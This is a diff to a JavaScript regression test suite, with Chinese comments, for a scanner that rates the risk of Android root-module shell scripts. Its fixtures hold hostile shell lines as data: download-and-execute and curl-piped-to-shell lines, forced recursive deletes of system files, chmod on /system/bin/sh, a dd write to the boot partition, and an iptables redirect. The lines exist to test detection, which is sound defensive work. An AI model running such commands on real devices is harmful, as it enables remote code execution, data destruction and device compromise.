@@ -346,6 +346,86 @@ const REGRESSION = [
     measured: 'high / block',
     axis: 'malice', // PIPE_TO_SHELL 在名单里：豁免撤销的是 EXEC_BUNDLED_FILE，撤不掉载荷自己那一行
   },
+  {
+    id: 'REG-13',
+    name: '同一逻辑行里的「先落盘再执行」（2026-11-19 补：旧判据要求执行行号严格更大）',
+    // 改前实测 0 命中：`wget -O /tmp/u URL && sh /tmp/u` 里 sink 与执行同行，旧过滤只比行号，
+    // 整条链沉默，只剩 NETWORK_FETCH/low。判据改成「行号更大，或同行但命令段序号更靠后」。
+    closesWhen: 'DOWNLOAD_THEN_EXEC 的命令段序号判据被退回「执行行号 > 落地行号」',
+    build: () => ({ id: 'eval.t7reg13', files: [
+      ['service.sh', body('wget -qO /data/local/tmp/u https://abc.cc/u && sh /data/local/tmp/u')],
+    ]}),
+    expectSpots: ['DOWNLOAD_THEN_EXEC/high@service.sh:2'],
+    measured: 'high / block（2026-11-19 实测；改造前这一形状 0 命中）',
+    axis: 'malice',
+  },
+  {
+    id: 'REG-14',
+    name: 'rm 的分开短选项与长选项（旧正则只认融合的 -rf / -fr）',
+    // 改前两条都 0 命中：判据把两个短选项的融合顺序写死在正则里。
+    // 现在由 rmFlags 判「递归 + 强制」是否同时在場，语法形态不再是结论的一部分。
+    closesWhen: 'RM_RF_MUTABLE 的 pattern 退回只认融合短选项，或 rmFlags 不再要求两边同时在场',
+    build: () => ({ id: 'eval.t7reg14', files: [
+      ['service.sh', body('rm -r -f /data/data/com.evil.app', 'rm --recursive --force /system/etc/hosts')],
+    ]}),
+    expectSpots: ['RM_RF_MUTABLE/medium@service.sh:2', 'RM_RF_MUTABLE/medium@service.sh:3'],
+    measured: 'medium / auto-approve ×2（改造前两条都 0 命中）',
+    axis: 'annotation',
+  },
+  {
+    id: 'REG-15',
+    name: '直接对真实分区 chmod / ln（旧动词表只有 touch/cp/mv/dd/mkdir/sed -i/tee）',
+    closesWhen: 'WRITE_SYSTEM_VENDOR 的动词表丢掉 chmod/chown/ln/install，或 overlayOnlyMatch 开始把真分区目标也当覆盖层',
+    build: () => ({ id: 'eval.t7reg15', files: [
+      ['service.sh', body('chmod 755 /system/bin/sh', 'ln -s /data/local/tmp/x /system/bin/x')],
+    ]}),
+    expectSpots: ['WRITE_SYSTEM_VENDOR/high@service.sh:2', 'WRITE_SYSTEM_VENDOR/high@service.sh:3'],
+    measured: 'high / block ×2（改造前 0 命中）',
+    axis: 'malice',
+  },
+  {
+    id: 'REG-16',
+    name: '新补五条里「单看是能力」的三条：开机钩子投放 / 流量改道 / 内核参数',
+    // 2026-11-19 拆行：五条按「有没有正当读法」分两处。这一行是**故意留在名单外**的三条 ——
+    // 开机钩子、代理/抓包、sysctl 在正经模块里都常见，按单条进名单就是拿误伤换命中（§0.1 的反面）；
+    // 它们唯一有拦截力的那一格是组合（NET_REDIRECT + MAC 放松），由 malice-axis.test.mjs 的
+    // 2b 与下面的 REG-17 之外那条组合用例判 —— 单条永远只标注。
+    closesWhen: 'PERSIST_DROP / NET_REDIRECT / KERNEL_SYSCTL_WRITE 任一条被摘掉或不再认这一族写法',
+    build: () => ({ id: 'eval.t7reg16', files: [
+      ['service.sh', body(
+        'cp /data/local/tmp/d.sh /data/adb/service.d/d.sh',
+        'iptables -t nat -A PREROUTING -p tcp -j REDIRECT --to-ports 8080',
+        'sysctl -w net.ipv4.ip_forward=1',
+      )],
+    ]}),
+    expectSpots: [
+      'PERSIST_DROP/medium@service.sh:2',
+      'NET_REDIRECT/medium@service.sh:3',
+      'KERNEL_SYSCTL_WRITE/medium@service.sh:4',
+    ],
+    measured: 'medium / auto-approve（三条逐条进标注：都是能力，不是恶意）',
+    axis: 'annotation',
+  },
+  {
+    id: 'REG-17',
+    name: '新补五条里「没有正当读法」的两条：不落盘执行 / 裸分区写（2026-11-19 起进拦截名单）',
+    // 用户 2026-11-19 定调「确实查出来是恶意模块的必须拦」之后进名单的两条。
+    // 它们不是「high 就拦」：同一批里另外三条 high/medium 仍然只标注（REG-16 就是那三条的证人），
+    // 差别只在「形状有没有正当读法」—— 不落盘执行读不到载荷、写裸分区绕过 AVB。
+    closesWhen: 'INLINE_REMOTE_EXEC / RAW_BLOCK_WRITE 任一条被摘掉，或被从 MALICE_LIST 退出去（那等于把这一格重新打开）',
+    build: () => ({ id: 'eval.t7reg17', files: [
+      ['service.sh', body(
+        'sh -c "$(curl -fsSL https://abc.cc/x)"',
+        'dd if=/sdcard/boot.img of=/dev/block/by-name/boot',
+      )],
+    ]}),
+    expectSpots: [
+      'INLINE_REMOTE_EXEC/high@service.sh:2',
+      'RAW_BLOCK_WRITE/high@service.sh:3',
+    ],
+    measured: 'high / block（两人都在名单里：命中就拒，不再走标注）',
+    axis: 'malice',
+  },
 ];
 
 // 表一的每一条：断「这一轮的那条规则确实在说话」+ 断「换轴之后它落在哪一根轴上」。
@@ -395,13 +475,17 @@ const SENTINELS = [
   },
   {
     id: 'SEN-02',
-    name: '正经去广告模块（追加 hosts）封顶在 medium：新规则不许把它抬到 high',
+    name: '正经去广告模块（覆盖层 hosts）封顶在 medium：新规则不许把它抬到 high',
     // 计划 §0 表第 5 行今天仍是 medium/block（假阳性，走人工）。这一格锁的是**上限**：
+    // 2026-11-19 夹具换形：旧夹具那行是 `cp $MODPATH/hosts.txt /data/adb/modules/$MODID/blockers.txt` ——
+    // 它根本没碰解析表，只是文件名里带 “hosts”；旧判据认词不认目标，所以那条 medium 是**假阳性**本身。
+    // 收窄到「目标必须是 etc/hosts」之后，本哨兵改用真去广告形状（写进覆盖层那份 hosts），
+    // 断的东西没变：正经包仍封顶在 medium、仍自动放行、HOSTS_MODIFY 那一支仍在且是 medium。
     // 加严方向的任何改动都要先解释这一行。
     closesWhen: 'HOSTS_MODIFY 那一支被抬到 high，或新规则在这个形状上追加了计入定级的命中',
     expect: 'capped-medium',
     build: () => ({ id: 'eval.t7sen02', files: [
-      ['customize.sh', body('cp $MODPATH/hosts.txt /data/adb/modules/$MODID/blockers.txt')],
+      ['customize.sh', body('mkdir -p $MODPATH/system/etc && cp $MODPATH/hosts.txt $MODPATH/system/etc/hosts')],
       ['hosts.txt', '127.0.0.1 ads.example.com\n'],
     ]}),
     measured: 'medium / auto-approve（2026-10-21 换轴实测；换轴前是「medium / block（HOSTS_MODIFY/medium + HARDCODED_IP/low）」）'
@@ -881,6 +965,44 @@ const NARROWING_WITNESSES = [
     measured: 'high / auto-approve（2026-10-21 换轴实测；换轴前是「high / block（conf.json 在 scripts 里，revokedBundledRefs 仍为空）」）'
       + '—— conf.json 在 scripts 里、revokedBundledRefs 仍为空这两件事一字未变。',
   },
+  {
+    id: 'NW-9',
+    name: 'HOSTS_MODIFY 收窄到 etc/hosts ⇒ 只是文件名带 hosts 的那一行不再发 medium（2026-11-19）',
+    // 旧判据认词不认目标：`> "$MODPATH/hosts"` 也发 medium（SEN-02 的旧夹具正是这种假阳性）。
+    closesWhen: 'HOSTS_MODIFY 的 pattern 退回「行里有 hosts 这个词」，或收窄把 $MODPATH/system/etc/hosts 那一支也放走',
+    build: () => ({ id: 'eval.t7nw9', files: [
+      ['customize.sh', body(
+        'echo "127.0.0.1 localhost" > "$MODPATH/hosts"',
+        'mkdir -p $MODPATH/system/etc && cp $MODPATH/hosts.txt $MODPATH/system/etc/hosts',
+      )],
+      ['hosts.txt', '127.0.0.1 ads.example.com\n'],
+    ]}),
+    check: (r) => {
+      assert.deepEqual(spotOf(r, 'HOSTS_MODIFY'), ['medium@customize.sh:3'],
+        '真去广告那一行必须在，只有文件名的第 2 行不许发：' + JSON.stringify(spots(r)));
+      // 整包是 high，但那条 high 来自 MODDIR_RUNTIME_WRITE（运行时往模块目录写 `> "$MODPATH/hosts"`），
+      // 与 hosts 收窄无关 —— 兄弟规则不许被这一手带走，所以它也要单独点名。
+      assert.ok(spotOf(r, 'MODDIR_RUNTIME_WRITE').includes('high@customize.sh:2'),
+        '兄弟规则那一支必须还在：' + JSON.stringify(spots(r)));
+    },
+    measured: 'medium / auto-approve，HOSTS_MODIFY 只落在 customize.sh:3',
+  },
+  {
+    id: 'NW-10',
+    name: 'HARDCODED_IP 收窄到「有取用上下文」⇒ 文案里的版本号 1.2.3.4 不再发 medium（2026-11-19）',
+    closesWhen: 'HARDCODED_IP 的 severityFor 丢掉语境判据（退回「任何四段数字都报」），或语境表把真 C2 写法放走',
+    build: () => ({ id: 'eval.t7nw10', files: [
+      ['service.sh', body(
+        'echo "安装 1.2.3.4 完成"',
+        'curl -fsSL http://203.0.113.9/a.sh -o /tmp/a.sh',
+      )],
+    ]}),
+    check: (r) => {
+      assert.deepEqual(spotOf(r, 'HARDCODED_IP'), ['medium@service.sh:3'],
+        '有取用上下文的那一行必须在，裸版本号那一行不许发：' + JSON.stringify(spots(r)));
+    },
+    measured: 'medium / auto-approve，HARDCODED_IP 只落在 service.sh:3',
+  },
 ];
 
 for (const row of NARROWING_WITNESSES) {
@@ -893,11 +1015,12 @@ for (const row of NARROWING_WITNESSES) {
 }
 
 const NARROWING_IDS = Object.freeze([
-  'NW-1', 'NW-2', 'NW-3', 'NW-4', 'NW-5', 'NW-6', 'NW-7', 'NW-8',
+  'NW-1', 'NW-2', 'NW-3', 'NW-4', 'NW-5', 'NW-6', 'NW-7', 'NW-8', 'NW-9', 'NW-10',
 ]);
 const REGRESSION_IDS = Object.freeze([
   'REG-01', 'REG-02', 'REG-03', 'REG-04', 'REG-05', 'REG-06', 'REG-07', 'REG-08',
-  'REG-09', 'REG-10', 'REG-11', 'REG-12',
+  'REG-09', 'REG-10', 'REG-11', 'REG-12', 'REG-13', 'REG-14', 'REG-15', 'REG-16',
+  'REG-17',
 ]);
 
 // ---------------------------------------------------------------------------
